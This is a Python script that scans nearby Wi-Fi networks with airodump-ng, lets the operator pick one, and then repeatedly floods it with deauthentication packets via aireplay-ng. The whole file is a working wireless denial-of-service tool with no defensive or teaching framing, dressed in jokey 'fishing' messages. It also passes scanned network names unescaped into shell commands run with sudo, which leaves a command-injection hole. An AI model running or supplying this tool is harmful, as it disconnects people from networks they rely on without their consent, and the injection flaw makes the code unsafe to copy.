import subprocess, time, sys, argparse, inquirer, re









red = "\033[1;31m"

green = "\033[1;32m"

yellow = "\033[1;33m"

blue = "\033[1;34m"









def deleteF():

    subprocess.run( "sudo rm -rf ./wifiBssid.py ./wifiChannel.py ./wifiInterF.txt ./essidColt.py", shell = True, check = True )









def downLine( t = 12 ):

    sTime = time.time()

    length = 30

    while time.time() - sTime <= t:

        eTime = time.time() - sTime

        p = eTime / t

        line = f"\r{ green }Program is fishing 🎣: { '-' * int( length * p ):{ length }s} { int( p * 101 ) }%"

        sys.stdout.write( line )

        sys.stdout.flush()

        time.sleep( 0.1 )









def iwCh( channel, interface ):

    try:

        cmd = f"sudo iwconfig { interface } channel { channel }"

        subprocess.run( cmd, shell = True, check = True )

    except:

        print( f"\n\n{ red }Getting error in setting channel on { interface }!\nLet him fish again!\n\n" )

        deleteF()

        sys.exit( 0 )









def kiddDeAuth( BSSID, interface ):

    try:

        print( f"\n\n{ red }Program is roasting the fish!\n\n" )

        cmd = [ "sudo", "aireplay-ng", "-0", "0", "-a", BSSID, interface ]

        p = subprocess.Popen( cmd )

        time.sleep( 20 )

        p.terminate()

        p.wait()

        print( f"\n\n{ green }Taking a nap 💤\n\n" )

        time.sleep( 60 )

        kiddDeAuth( BSSID, interface )

    except:

        deleteF()

        print( f"\n{ red }Stop sending DeAuth and files created by this script have been deleted!\n" )

        sys.exit( 0 )









def air( IF ):

    lst = []

    rmLst = [ "AUTH", "ESSID", "PSK", "OPN", "0>" ]

    dic = {}

    f = open( "wifiInterF.txt", "w" )

    cmd = [ "sudo", "airodump-ng", "-i", IF ]

    p = subprocess.Popen( cmd, stdout = f )

    print( "\n\n" )

    downLine()

    p.terminate()

    p.wait()

    essidCmd = "sudo awk '{print $11, $12, $13, $14, $15, $16, $17, $18, $19 $20}' wifiInterF.txt | sort -u > essidColt.py"

    subprocess.run( essidCmd, shell = True, check = True )

    time.sleep( 0.2 )

    with open( "essidColt.py", "r" ) as f:

        for readL in f:

            mdWrd = readL.strip()

            for y in rmLst:

                mdWrd = mdWrd.replace( y, "" )

            lst.append( mdWrd.strip() )

    clnData = [ re.sub( r'\x1b\[.*?K', '', x ) for x in lst ]

    clnData1 = [ x.strip() for x in clnData if x.strip() != "" ]

    resultLst = list( set( clnData1 ) )

    wihOne = [ inquirer.List( "opt", message = "Choose a fish name", choices = resultLst ) ]

    wifiName = inquirer.prompt( wihOne )[ "opt" ]

    ESSID = wifiName.lower()

    cmd1 = "sudo grep -i '%s' wifiInterF.txt | head -n 1 | awk '{ print $2 }' > wifiBssid.py" % ESSID

    cmd2 = "sudo grep -i '%s' wifiInterF.txt | head -n 1 | awk '{ print $7 }' > wifiChannel.py" % ESSID

    subprocess.run( cmd1, shell = True, check = True )

    time.sleep( 0.2 )

    subprocess.run( cmd2, shell = True, check = True )

    time.sleep( 0.2 )

    try:

        bFile = open( "wifiBssid.py", "r" )

        cFile = open( "wifiChannel.py", "r" )

        bssid = bFile.read().strip()

        chnel = cFile.read().strip()

        if bssid == "" or chnel == "":

            print( f"\n\n{ yellow }1. Run the script in a full-screen terminal\n\n2. Ensure your IF is in monitor mode.\n\n" )

            sys.exit( 0 )

        else:

            print( f"\n\n\n{ green }🐟 { wifiName } fish on!\n\n" )

            dic[ "bssid" ] = bssid

            dic[ "channel" ] = chnel

    except:

        print( f"\n\n{ red }wifiBssid or wifiChannel files are not found!\n\n" )

        deleteF()

        sys.exit( 0 )

    iwCh( dic[ "channel" ], IF )

    kiddDeAuth( dic[ "bssid" ], IF )









def main():

    creOpt = argparse.ArgumentParser( description = "How to use?" )

    creOpt.add_argument( "-i", "--interface", type = str, required = True, help = "Network interface" )

    opt = creOpt.parse_args()

    air( opt.interface )









if __name__ == "__main__":

    main()
